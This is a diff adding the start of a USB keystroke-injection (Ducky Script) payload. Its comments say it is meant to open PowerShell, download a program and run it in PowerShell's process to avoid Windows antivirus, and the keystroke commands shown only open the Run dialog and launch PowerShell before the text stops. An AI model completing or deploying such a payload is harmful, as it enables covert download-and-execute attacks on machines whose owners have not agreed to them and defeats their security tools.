@@ -1,0 +1,5 @@
+REM This script opens Powershell, downloads a program and preferbly runs it in powershells process to go undetected by windows av
+REM Create a command line driven porgram
+GUI r 
+STRING powershell 
+ENTER
